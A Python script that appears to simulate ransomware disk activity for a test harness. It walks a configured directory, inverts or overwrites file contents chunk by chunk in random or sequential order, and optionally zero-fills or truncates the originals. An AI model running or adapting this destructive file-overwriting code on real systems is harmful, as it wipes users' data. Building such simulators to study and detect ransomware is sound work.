import os
import shutil
import sys

import threading
from queue import Queue, PriorityQueue

config_dir = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

sys.path.append(config_dir)

from config import PATHS, LOG_NAME, MAGIC_NUM
from config import print_red

mode = 'O'
timeout = 0
blknum = 25000
threads = 1
access = 'R'
Nrthreads = 1
Nwthreads = 1
Yfsync = 'N'

class NoneWrapper:
    """
    workaround for priority queue not supporting None
    """
    def __lt__(self, other):
        return False


class Chunk:
    def __init__(self, fpath, loff, length, data=None):
        self.fpath = fpath
        self.loff = loff
        self.length = length
        self.data = data

    def __lt__(self, other):
        if not isinstance(other, Chunk):
            return NotImplemented
        return (self.fpath, self.loff) < (other.fpath, other.loff)

def encrypt(data):
    """
    Encrypt the data by reverting each byte.
    """
    return bytes(~x & 0xff for x in data)

import time
class Stopper:
    """
    This class is used to stop the ransomware after numblk blocks are operated.
    This class should compatibly work with multi-threaded and R W concurrent situation.
    Each stop should last for timeout seconds.
    """
    def __init__(self, numblk, timeout):
        self.numblk = numblk
        self.timeout = timeout
        self.lock = threading.Lock()
        self.stop = False
        self.stop_time = 0

    def check_stop(self):
        """
        Check if the ransomware should stop.
        """
        with self.lock:
            if self.stop:
                if time.time() - self.stop_time > self.timeout:
                    self.stop = False
                    return False
                else:
                    return True
            else:
                return False

    def stop_now(self):
        """
        Set the stop flag to True.
        """
        with self.lock:
            self.stop = True
            self.stop_time = time.time()


def read_rand(tar_sys_path, queue, chunk_size = 4096, rm = False, shred = False):
    """
    Read files from tar_sys_path and insert them into chunk_set which is a class consisting of a dictionary of chunks.
    The ChunkSet is indexed by fpath and each fpath is mapped to a list of chunks.
    This function blocks unlike threaded prefixed functions.
    @rm determines whether we need to remove the file 
    and create an empty one after reading it.
    """
    

    for root, dirs, files in os.walk(tar_sys_path):
        for filename in files:
            # Get the file length first
            flen = os.path.getsize(os.path.join(root, filename))
            
            filepath = os.path.join(root, filename)
            with open(filepath, "rb") as f:
                loff_set = [i for i in range(0, flen, chunk_size)]
                # randomize the loff_set
                import random
                random.shuffle(loff_set)
                for loff in loff_set:
                    f.seek(loff)
                    chunk = encrypt(f.read(chunk_size))
                    queue.put(Chunk(filepath, loff, len(chunk), chunk))
            if shred:
                with open(filepath, "r+b") as f:
                    f.write(bytes([0] * flen))
            if rm:
                with open(filepath, "wb") as f:
                    pass
            if (shred or rm) and Yfsync == 'Y':
                with open(filepath, "r+b") as f:
                    f.flush()
                    os.fsync(f.fileno())
            



    

def read_whole_file(tar_sys_path, queue, chunk_size = 4096, rm = False, shred = False):
    """
    Basically the same as read_rand() but reads 
    the whole file at once(then divide into chunks in memory) instead of in chunks.
    This function blocks unlike threaded prefixed functions.
    @rm determines whether we need to remove the file 
    and create an empty one after reading it.
    """

    for root, dirs, files in os.walk(tar_sys_path):
        for filename in files:
            filepath = os.path.join(root, filename)
            with open(filepath, "rb") as f:
                file_contents = f.read()
                loff = 0
                while loff < len(file_contents):
                    chunk = encrypt(file_contents[loff:loff+chunk_size])
                    queue.put(Chunk(filepath, loff, len(chunk), chunk))
                    loff += len(chunk)
            flen = os.path.getsize(filepath)
            if shred:
                with open(filepath, "r+b") as f:
                    f.write(bytes([0] * flen))
            if rm:
                with open(filepath, "wb") as f:
                    pass
            if (shred or rm) and Yfsync == 'Y':
                with open(filepath, "r+b") as f:
                    f.flush()
                    os.fsync(f.fileno())

def read_seq_threaded(tar_sys_path, queue, fname_queue, flocks, 
                      chunk_size = 4096, num_threads = 1, rm = False, shred = False):
    """
    Read files from tar_sys_path and insert them into a queue.
    The access pattern is sequential.
    @rm determines whether we need to remove the file and 
    create an empty one after reading it.
    """
    MAGIC_3 = MAGIC_NUM['MAGIC_NUM3']

    # Add all the filenames to the queue
    for root, dirs, files in os.walk(tar_sys_path):
        for filename in files:
            filepath = os.path.join(root, filename)
            fname_queue.put(filepath)

    # Create a worker function to read files and insert chunks into the ChunkSet
    def worker(queue):
        while True:
            # Get the next filename from the queue
            filepath = fname_queue.get()
            if filepath is None:
                break

            # Read the file contents into memory
            with flocks[filepath]:
                with open(filepath, "rb") as f:
                    file_contents = f.read()
                flen = os.path.getsize(filepath)
                if shred:
                    with open(filepath, "r+b") as f:
                        f.write(bytes([0] * flen))
                if rm:
                    with open(filepath, "wb") as f:
                        pass
                if (shred or rm) and Yfsync == 'Y':
                    with open(filepath, "r+b") as f:
                        f.flush()
                        os.fsync(f.fileno())
            if file_contents:
                MAGIC_3 = file_contents[0]
            # Split the file contents into chunks and insert them into the ChunkSet
            loff = 0
            while loff < len(file_contents):
                # chunk = [encrypt(file_contents[loff:loff+chunk_size])]
                chunk = bytes([255 - int(MAGIC_3)]*chunk_size) # faster to test 
                queue.put(Chunk(filepath, loff, len(chunk), chunk))
                loff += len(chunk)
            # Mark the filename as done
            fname_queue.task_done()

    # Create a pool of worker threads
    threads = []
    for i in range(num_threads):
        t = threading.Thread(target=worker, args=(queue,))
        t.start()
        threads.append(t)

    return threads


def read_rand_threaded(tar_sys_path, queue, fname_queue, flocks, 
                       chunk_size = 4096, num_threads = 1, rm = False, shred = False):
    """
    Read files from tar_sys_path and insert them into a queue.
    The access pattern is random. To achieve this, we use 1 shuffle to randomize the loff_set.
    @rm determines whether we need to remove the file and 
    create an empty one after reading it.
    """

    # Add all the filenames to the queue
    for root, dirs, files in os.walk(tar_sys_path):
        for filename in files:
            filepath = os.path.join(root, filename)
            fname_queue.put(filepath)

    # Create a worker function to read files and insert chunks into the ChunkSet
    def worker(queue):
        while True:
            # Get the next filename from the queue
            filepath = fname_queue.get()
            if filepath is None:
                break
            # Get the file length first
            flen = os.path.getsize(os.path.join(root, filepath))
            loff_set = [i for i in range(0, flen, chunk_size)]
            import random
            random.shuffle(loff_set)
            # Read the file contents into memory
            with flocks[filepath]:
                chunks = []
                with open(filepath, "rb") as f:
                    # randomize the loff_set
                    for loff in loff_set:
                        f.seek(loff)
                        chunk = f.read(chunk_size)
                        # chunk = encrypt(chunk)
                        if chunk:
                            chunk = bytes([255 - int(chunk[0])]*len(chunk)) # faster to test
                            chunks.append(chunk)
                for chunk in chunks:
                    queue.put(Chunk(filepath, loff, len(chunk), chunk))
                flen = os.path.getsize(filepath)
                if shred:
                    with open(filepath, "r+b") as f:
                        f.write(bytes([0] * flen))
                if rm:
                    with open(filepath, "wb") as f:
                        pass
                if (shred or rm) and Yfsync == 'Y':
                    with open(filepath, "r+b") as f:
                        f.flush()
                        os.fsync(f.fileno())

            # Mark the filename as done
            fname_queue.task_done()

    # Create a pool of worker threads
    threads = []
    for i in range(num_threads):
        t = threading.Thread(target=worker, args=(queue,))
        t.start()
        threads.append(t)

    return threads

def flush_sync_files(tar_sys_path):
    """ 
    Flush the files in tar_sys_path to disk by calling f.flush then os.sync.
    """
    import time
    flush_start = time.time()
    for root, dirs, files in os.walk(tar_sys_path):
        for filename in files:
            filepath = os.path.join(root, filename)
            with open(filepath, "r+b") as f:
                f.flush()
                os.fsync(f.fileno())
    print(f"Flush time: {time.time() - flush_start} seconds")


def flush_chunk_buf(chunks, flocks = None):
    """
    This flush is needed for creating a random access write workload.
    When writing, we first cache some blocks in memory, then we shuffle the blocks.
    Then we write the blocks back to disk in a random order.
    Note :
        This function has nonthing to do with consistency (flush & sync)
    """
    if flocks is None:
        for chunk in chunks:
            with open(chunk.fpath, "r+b") as f:
                f.seek(chunk.loff)
                f.write(chunk.data)
    else:
        for chunk in chunks:
            with flocks[chunk.fpath]:
                with open(chunk.fpath, "r+b") as f:
                    f.seek(chunk.loff)
                    f.write(chunk.data)

    chunks.clear()

# write has side-effect of flushing & syncing if enabled

def write_rand(queue, tar_sys_path):
    """
    Note : Important - This function must be followed by a BLOCKED read function. 
    Meaning nothing will go to queue
    Write the encrypted chunks in chunk_set back to tar_sys_path.
    """
    import random
    CHUNK_CACHE_SIZE = 100
    chunks = []
    while not queue.empty():
        chunks.append(queue.get())
        if len(chunks) == CHUNK_CACHE_SIZE:
            random.shuffle(chunks)
            flush_chunk_buf(chunks)
    random.shuffle(chunks)
    flush_chunk_buf(chunks)


def write_whole_files(queue, tar_sys_path):
    """
    Note : Important - This function must be followed by a BLOCKED read function. 
    Meaning nothing will go to queue
    For each file, we first assemble the chunks then write the whole file back to disk.
    """
    while not queue.empty():
        chunk = queue.get()
        with open(chunk.fpath, "r+b") as f:
            f.seek(chunk.loff)
            f.write(chunk.data)


def write_seq_threaded(queue, tar_sys_path, flocks, num_threads = 1):
    """
    Write the encrypted chunks in chunk_set back to tar_sys_path in parallel.
    """

    # Create a worker function to write files
    def worker(queue):
        while True:
            # Get the next filename from the queue
            try:
                chunk = queue.get(block = False)
                if isinstance(chunk, NoneWrapper):
                    break
                # Write the file contents to disk
                with flocks[chunk.fpath]:
                    with open(chunk.fpath, "r+b") as f:
                        f.seek(chunk.loff)
                        f.write(chunk.data)

                # Mark the filename as done
                queue.task_done()
            except:
                pass
            

    # Create a pool of worker threads
    threads = []
    for i in range(num_threads):
        t = threading.Thread(target=worker, args=(queue,))
        t.start()
        threads.append(t)

    return threads

def write_rand_threaded(queue, tar_sys_path, flocks, num_threads = 1):
    """
    Write the encrypted chunks in chunk_set back to tar_sys_path in parallel.
    """
    # Create a worker function to write files
    def worker(queue):
        import random
        CHUNK_CACHE_SIZE = 10
        chunks = []
        while True:
            # Get the next filename from the queue
            try:
                chunk = queue.get()
                if isinstance(chunk, NoneWrapper):
                    break
                chunks.append(chunk)
                if len(chunks) == CHUNK_CACHE_SIZE:
                    random.shuffle(chunks)
                    flush_chunk_buf(chunks, flocks)

                # Mark the filename as done
                queue.task_done()
            except:
                if chunks:
                    random.shuffle(chunks)
                    flush_chunk_buf(chunks, flocks)
                pass
            

    # Create a pool of worker threads
    threads = []
    for i in range(num_threads):
        t = threading.Thread(target=worker, args=(queue,))
        t.start()
        threads.append(t)

    return threads

  


def delete_all(tar_sys_path):
    """
    Delete all the files in tar_sys_path.
    """
    for root, dirs, files in os.walk(tar_sys_path):
        for filename in files:
            filepath = os.path.join(root, filename)
            os.remove(filepath)
            
def create_all(tar_sys_path, chunk_set):
    """
    Get keys from chunk set (a set of file names) then we create those files in tar_sys_path as empty files.
    """
    fnames = chunk_set.get_names()
    for name in fnames:
        filepath = name
        with open(filepath, "wb") as f:
            pass

# below are a list of operation sequences

def main_overwrite():
    tar_sys_path = PATHS['injected_path']
    # file locks(flocks) are to protect against seek race conditions
    # Notice in python open will also move the file pointer, so 
    # seek, open should be protected by the same lock.
    # Each file 
    flocks = {os.path.join(root, filename) : threading.Lock() 
             for root, dirs, files in os.walk(tar_sys_path) 
                for filename in files} 
    queue = PriorityQueue()
    fname_queue = Queue()
    if access.split('/')[0].rstrip('\n') == 'R':
        rthreads = read_rand_threaded(tar_sys_path, queue, fname_queue, flocks,
                                        chunk_size = 4096, num_threads = Nrthreads)
    elif access.split('/')[0].rstrip('\n') == 'S':
        rthreads = read_seq_threaded(tar_sys_path, queue, fname_queue, flocks, 
                                    chunk_size = 4096, num_threads = Nrthreads)
    else:
        print("------ ERR -------")
        print("Invalid access pattern")
        print("------------------")
        exit(1)

    if access.split('/')[1].rstrip('\n') == 'R':
        wthreads = write_rand_threaded(queue, tar_sys_path, flocks, num_threads = Nwthreads)
    elif access.split('/')[1].rstrip('\n') == 'S':
        wthreads = write_rand_threaded(queue, tar_sys_path, flocks, num_threads = Nwthreads)
    else:
        print("------ ERR -------")
        print("Invalid access pattern")
        print("------------------")
        exit(1)
    
    # wait for all the read threads to finish
    fname_queue.join()
    for i in range(len(rthreads)):
        fname_queue.put(None)
    for t in rthreads:
        t.join()

    # wait for all the write threads to finish
    queue.join()
    for i in range(len(wthreads)):
        queue.put(NoneWrapper()) 
    for t in wthreads:
        t.join()

    flush_sync_files(tar_sys_path)

    


    
def main_deletecreate():
    tar_sys_path = PATHS["injected_path"]
    queue = PriorityQueue()

    flocks = {os.path.join(root, filename) : threading.Lock() 
             for root, dirs, files in os.walk(tar_sys_path) 
                for filename in files} 
    queue = PriorityQueue()
    fname_queue = Queue()

    if access.split('/')[0].rstrip('\n') == 'R':
        rthreads = read_rand_threaded(tar_sys_path, queue, fname_queue, flocks,
                                        chunk_size = 4096, num_threads = Nrthreads, rm = True)
    elif access.split('/')[0].rstrip('\n') == 'S':
        rthreads = read_seq_threaded(tar_sys_path, queue, fname_queue, flocks, 
                                    chunk_size = 4096, num_threads = Nrthreads, rm = True)
    else:
        print("------ ERR -------")
        print("Invalid access pattern")
        print("------------------")
        exit(1)

    if access.split('/')[1].rstrip('\n') == 'R':
        wthreads = write_rand_threaded(queue, tar_sys_path, flocks, num_threads = Nwthreads)
    elif access.split('/')[1].rstrip('\n') == 'S':
        wthreads = write_rand_threaded(queue, tar_sys_path, flocks, num_threads = Nwthreads)
    else:
        print("------ ERR -------")
        print("Invalid access pattern")
        print("------------------")
        exit(1)

    # wait for all the read threads to finish
    fname_queue.join()
    for i in range(len(rthreads)):
        fname_queue.put(None)
    for t in rthreads:
        t.join()

    # wait for all the write threads to finish
    queue.join()
    for i in range(len(wthreads)):
        queue.put(NoneWrapper()) 
    for t in wthreads:
        t.join()

    flush_sync_files(tar_sys_path)

def main_shredcreate():
    tar_sys_path = PATHS["injected_path"]
    queue = PriorityQueue()

    flocks = {os.path.join(root, filename) : threading.Lock() 
             for root, dirs, files in os.walk(tar_sys_path) 
                for filename in files} 
    queue = PriorityQueue()
    fname_queue = Queue()

    if access.split('/')[0].rstrip('\n') == 'R':
        rthreads = read_rand_threaded(tar_sys_path, queue, fname_queue, flocks,
                                        chunk_size = 4096, num_threads = Nrthreads, 
                                        rm = True, shred = True)
    elif access.split('/')[0].rstrip('\n') == 'S':
        rthreads = read_seq_threaded(tar_sys_path, queue, fname_queue, flocks, 
                                    chunk_size = 4096, num_threads = Nrthreads,
                                    rm = True, shred = True)
    else:
        print("------ ERR -------")
        print("Invalid access pattern")
        print("------------------")
        exit(1)

    if access.split('/')[1].rstrip('\n') == 'R':
        wthreads = write_rand_threaded(queue, tar_sys_path, flocks, num_threads = Nwthreads)
    elif access.split('/')[1].rstrip('\n') == 'S':
        wthreads = write_rand_threaded(queue, tar_sys_path, flocks, num_threads = Nwthreads)
    else:
        print("------ ERR -------")
        print("Invalid access pattern")
        print("------------------")
        exit(1)

    # wait for all the read threads to finish
    fname_queue.join()
    for i in range(len(rthreads)):
        fname_queue.put(None)
    for t in rthreads:
        t.join()

    # wait for all the write threads to finish
    queue.join()
    for i in range(len(wthreads)):
        queue.put(NoneWrapper()) 
    for t in wthreads:
        t.join()

    flush_sync_files(tar_sys_path)

# below are a list of helper functions

def read_attr():
    global mode, timeout, blknum, threads, access, Yfsync
    global Nrthreads, Nwthreads
    test_dir_path_file = PATHS['test_dir_path_file']
    with open(test_dir_path_file, 'r') as f:
        test_dir = f.read()
    attr_file = os.path.join(test_dir, LOG_NAME['test_info'])
    with open(attr_file, 'r') as f:
        lines = f.readlines()
        for line in lines:
            if line.startswith('mode='):
                mode = line.split('=')[1].rstrip('\n')
            elif line.startswith('timeout='):
                timeout = line.split('=')[1].rstrip('\n')
            elif line.startswith('blknum='):
                blknum = line.split('=')[1].rstrip('\n')
            elif line.startswith('threads='):
                threads = line.split('=')[1].rstrip('\n')
                Nrthreads = int(threads.split('/')[0])
                Nwthreads = int(threads.split('/')[1].rstrip('\n'))
            elif line.startswith('access='):
                access = line.split('=')[1].rstrip('\n')
            elif line.startswith('fsync='):
                Yfsync = line.split('=')[1].rstrip('\n')
    print(f"mode={mode} timeout={timeout} blknum={blknum} threads={threads} access={access}")
    return

if __name__ == '__main__':
    read_attr()
    if mode == 'O':
        main_overwrite()
    elif mode == 'D':
        main_deletecreate()
    elif mode == 'S':
        main_shredcreate()
    else:
        print('Invalid mode number')
        exit(1)

# Below are legacy functions (not currently used)

def encrypt_filenames(tar_sys_path):
    """ legacy
        For all the files in tar_sys_path, encrypt the filenames by reverting the bytes
        that is, byte = ~byte
    """
    # Get a list of all files in the tar_sys_path
    files = os.listdir(tar_sys_path)

    # Loop through the files
    for file_name in files:
        # Get the full path of the file
        file_path = os.path.join(tar_sys_path, file_name)

        # Check if the file is a regular file
        if os.path.isfile(file_path):
            # Encrypt the file name by reverting each byte
            encrypted_name = ''.join(chr(~ord(c) & 0xff) for c in file_name)

            # Rename the file with the encrypted file name
            os.rename(file_path, os.path.join(tar_sys_path, encrypted_name))



def encrpt_all(chunk_set, tar_sys_path):
    """ legacy
    Encrypt all the files in tar_sys_path by calling encrypt function in ChunkSet class.
    """
    for root, dirs, files in os.walk(tar_sys_path):
        for filename in files:
            filepath = os.path.join(root, filename)
            chunk_set.encrpt(filepath)
